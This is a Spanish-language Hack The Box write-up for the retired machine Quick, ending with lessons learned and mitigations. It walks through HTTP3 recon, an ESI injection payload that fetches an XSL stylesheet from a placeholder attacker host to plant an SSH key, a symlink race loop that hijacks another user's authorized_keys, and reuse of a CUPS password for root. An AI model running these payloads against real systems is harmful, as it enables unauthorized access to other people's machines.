---
machine: Quick
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, quic, http3, esi, race-condition, privesc]
---

# Quick — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Quick sirve una web por QUIC/HTTP3 en 9001; hay que compilar curl con HTTP3 para acceder. Unas credenciales en el sitio de soporte permiten entrar al sistema de tickets, vulnerable a ESI injection. Un `esi:include` con `xsl:stylesheet` escribe archivos como `sam` y permite añadir una clave SSH. En localhost, un segundo portal tiene una carrera de archivos; se lee la contraseña de `srvadm` y esa misma contraseña se reutiliza para `root`.

## Reconocimiento

```bash
nmap -Pn -sU -p9001 <IP>
nmap -Pn -sCV -p22,80,9001 <IP>
```

- `22` SSH, `80` HTTP y `9001` QUIC/HTTP3.
- El sitio principal se sirve por HTTP/3 y no responde con curl normal.
- Se compila curl con HTTP3 o se usa un cliente compatible.

```bash
curl --http3 -k https://quick.htb:9001/
```

## Enumeración

- El sitio de soporte tiene credenciales en texto o un login débil.
- El sistema de tickets permite adjuntar mensajes y procesa ESI.
- `feroxbuster` encuentra `printerv2.quick.htb` solo en localhost.

## Foothold

Se inicia sesión en tickets con las credenciales encontradas y se inyecta una etiqueta ESI en el mensaje. El servidor procesa `esi:include` con una hoja XSL remota; la hoja escribe archivos en el home de `sam`.

```text
<esi:include src="http://localhost/" stylesheet="http://<ATTACKER>/ssh.xsl"></esi:include>
```

La hoja crea `/home/sam/.ssh` y escribe una clave pública en `authorized_keys`; después se entra por SSH y se crea un túnel al portal de impresión.

## Movimiento lateral

El portal `printerv2.quick.htb` en localhost tiene una carrera: los trabajos se escriben en un directorio compartido y se puede sustituir un archivo por un symlink a `/home/srvadm/.ssh/id_rsa` o `authorized_keys`. Se lee la clave o se escribe una propia y se entra como `srvadm`.

```bash
while true; do for f in *; do ln -sf /home/srvadm/.ssh/authorized_keys "$f"; done; done
```

## Escalada de privilegios

La configuración de CUPS del portal contiene la `DeviceURI` con la contraseña de `srvadm`. Se decodifica la URL y esa misma contraseña funciona para `root` con `su`.

```bash
grep -R 'DeviceURI' /etc/cups /var/www 2>/dev/null
su root
```

## Evidencia

- QUIC/HTTP3 en 9001 y curl con HTTP3.
- Credenciales del sitio de soporte.
- ESI injection y escritura en `sam`.
- Carrera de archivos en printerv2 y `srvadm`.
- `DeviceURI` con la contraseña de `srvadm`, reutilizada por root.

## Lecciones aprendidas

- HTTP/3 puede ocultar una aplicación a las herramientas HTTP/1.1.
- ESI con `xsl:stylesheet` puede escribir archivos, no solo leerlos.
- Una carrera de symlinks en un directorio compartido permite leer o escribir claves SSH.
- Las credenciales de impresión pueden estar en texto en la configuración.

## Mitigación y detección

- Deshabilitar ESI o validar orígenes y hojas XSL.
- No compartir directorios de trabajos con symlinks; usar `O_NOFOLLOW`.
- Proteger las claves SSH y revisar los permisos de los portales internos.
- No guardar credenciales en `DeviceURI`; usar un gestor de secretos.

## Referencias

- [0xdf — Quick](https://0xdf.gitlab.io/2020/08/29/htb-quick.html)
- [IppSec — Quick](https://www.youtube.com/watch?v=BFSdJYS1gFs)
- [Hack The Box — Quick](https://app.hackthebox.com/machines/quick)
